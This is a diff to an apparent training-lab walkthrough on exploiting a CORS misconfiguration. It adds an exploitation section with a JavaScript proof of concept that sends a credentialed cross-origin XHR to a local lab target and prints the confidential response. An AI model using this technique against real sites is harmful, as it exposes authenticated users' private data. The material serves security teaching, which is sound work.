@@ -11,10 +11,10 @@ and steal sensitive information from the server!
 Rather than explaining myself please refer to the following blog to read all about the 
 issue at hand:
 
-The source is found [here](https://github.com/RiieCco/owasp-bay-area/tree/master/course-guide/server-side-template-injection/report.html)
+The source is found [here](https://portswigger.net/blog/exploiting-cors-misconfigurations-for-bitcoins-and-bounties)
 
 
-### Spoiler 1
+### Spoiler 1 - discovery
 
 You can find this link after loggin in with either:
 
@@ -42,9 +42,48 @@ create the following response.
 ![request/response](../img/req-resp-cors.png)
 
 
+### Spoiler 2 - exploitation
 
+Now, the idea is to make an XHR GET request on the authenticated users' behalf
 
+To do so we create a HTML page with the following script in it:
 
+```
+<script>
+    var req = new XMLHttpRequest();
+    req.onload = reqListener;
+    req.open('get', 'http://0.0.0.0:8081/confidential', true);
+    req.withCredentials = true;
+    req.send();
+    function reqListener() {
+        document.getElementsByTagName("p")[0].innerHTML = req.responseText;
+    }
+</script>
 
+<p></p>
+```
 
+This script will make a cross origin request to the target application and puts the output of the 
+response in the paragrapgh tags.
 
+Now, this attack works pretty much like CSRF, it leans on the behaviour of your browsers cookie jar
+and the appending of the session cookie to requests. 
+
+Remeber this CORS header
+
+```
+Access-Control-Allow-Credentials: true
+```
+This header wil ultimately help us achieve our goal!
+
+Now look at the result:
+
+![result](../img/cors-result.png)
+
+Highlighed in red we see the target page. If you look at what is highlighted in blue you see
+this is just a local HTML file that does the XHR get request to the target server.
+
+Highlighted in purple you see the super secret information as a result.
+
+*Disclaimer:* In a real situation you wil most likely need to build your own small web-server
+to do the XHR GET request from. 
